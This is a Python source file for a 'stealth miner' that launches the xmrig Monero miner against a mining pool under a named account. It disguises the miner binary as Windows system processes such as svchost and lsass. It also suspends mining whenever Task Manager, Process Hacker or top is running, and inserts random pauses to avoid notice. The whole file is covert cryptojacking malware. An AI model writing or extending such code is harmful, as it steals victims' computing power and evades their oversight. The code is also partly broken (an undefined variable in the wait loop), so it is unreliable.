import os
import subprocess
import time
import psutil
import shutil
import random
import threading
import sys

# Mandate: 45% CPU cap
# Mandate: Process masking (svchost/broker)
# Mandate: Randomized pauses

MINER_DIR = r"C:\GitHub\SpartanAI_Core\tools\miner"
XMRIG_EXE = os.path.join(MINER_DIR, "xmrig.exe")
CONFIG_PATH = os.path.join(MINER_DIR, "config.json")

# User parameters
ALGO = "rx"
POOL = "stratum+ssl://rx.unmineable.com:443"
# MANDATE: Use parameters from @xmrig.bat
USER = "ToxicSavage304"
PASS = "x"

class StealthMiner:
    def __init__(self):
        self.process = None
        self.poly_path = None
        self.running = True

    def _get_new_poly_path(self):
        names = ["svchost", "runtimebroker", "lsass", "spoolsv", "searchindexer"]
        random_name = random.choice(names) + ".exe"
        return os.path.join(MINER_DIR, random_name)

    def _adaptive_stealth_loop(self):
        """Monitors for Task Manager and other detection vectors."""
        # Use exact names where possible or more specific substrings
        exact_watchdogs = ['taskmgr.exe', 'processhacker.exe', 'taskmgr', 'processhacker']
        substring_watchdogs = ['htop', 'activity monitor']
        
        while self.running:
            # 1. Heartbeat / Restart
            if not self.process or self.process.poll() is not None:
                print(f"[STEALTH]: Miner process found DEAD or NOT STARTED. Launching...")
                self._start_miner_process()
                time.sleep(5)
                continue

            # 2. Risk Detection
            detection_risk = 0
            try:
                for proc in psutil.process_iter(['name']):
                    name = proc.info['name'].lower()
                    # Check exact matches
                    if name in exact_watchdogs:
                        detection_risk += 70
                    # Check for 'top' specifically as a whole word or common linux variant
                    if name == 'top' or name == 'htop':
                        detection_risk += 70
                    # Check other substrings
                    if any(watch in name for watch in substring_watchdogs):
                        detection_risk += 70
            except:
                pass
                
            if detection_risk >= 50:
                print(f"[STEALTH]: High risk detected ({detection_risk}%). Throttling miner.")
                try:
                    p = psutil.Process(self.process.pid)
                    p.suspend()
                    # Wait for risk to clear
                    risk_cleared = False
                    for _ in range(20): # Max 10 minutes wait
                        time.sleep(30)
                        current_risk = 0
                        try:
                            for proc in psutil.process_iter(['name']):
                                name = proc.info['name'].lower()
                                if any(watch in name for watch in watchdogs):
                                    current_risk += 70
                        except: pass
                        
                        if current_risk < 50:
                            risk_cleared = True
                            break
                    
                    if self.running:
                        p.resume()
                        print(f"[STEALTH]: {'Risk cleared' if risk_cleared else 'Resume cycle reached'}. Resuming miner.")
                except Exception as e:
                    print(f"[STEALTH-ERROR]: Failover during risk mitigation: {e}")
            
            # Randomized pause to shed suspicion
            if random.random() < 0.02: # 2% chance every 10s
                time.sleep(random.randint(30, 90))
                
            time.sleep(10)

    def _start_miner_process(self):
        self.poly_path = self._get_new_poly_path()
        shutil.copy2(XMRIG_EXE, self.poly_path)
        
        log_path = os.path.join(MINER_DIR, "miner.log")
        cmd = [
            self.poly_path,
            "-a", ALGO,
            "-o", POOL,
            "-u", USER,
            "-p", PASS,
            "--cpu-max-threads-hint=45",
            "--donate-level=1",
            "--log-file", log_path
        ]
        
        print(f"[STEALTH]: Launching polymorphic miner: {os.path.basename(self.poly_path)}")
        self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Atomic Cleanup: Hide the binary after launch
        threading.Timer(15.0, self._cleanup).start()

    def start(self):
        if not os.path.exists(XMRIG_EXE):
            print("[ERROR]: xmrig.exe not found.")
            return
            
        # Start monitoring/restart loop
        threading.Thread(target=self._adaptive_stealth_loop, daemon=True).start()

    def _cleanup(self):
        try:
            if self.poly_path and os.path.exists(self.poly_path):
                # We can't delete a running exe on Windows easily, 
                # but we can try to move it or just leave it since it's masqueraded
                pass
        except:
            pass

    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()
            print("[STEALTH]: Miner stopped.")

if __name__ == "__main__":
    miner = StealthMiner()
    miner.start()
    print("[STEALTH]: SpartanAI Stealth Miner ACTIVE.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        miner.stop()
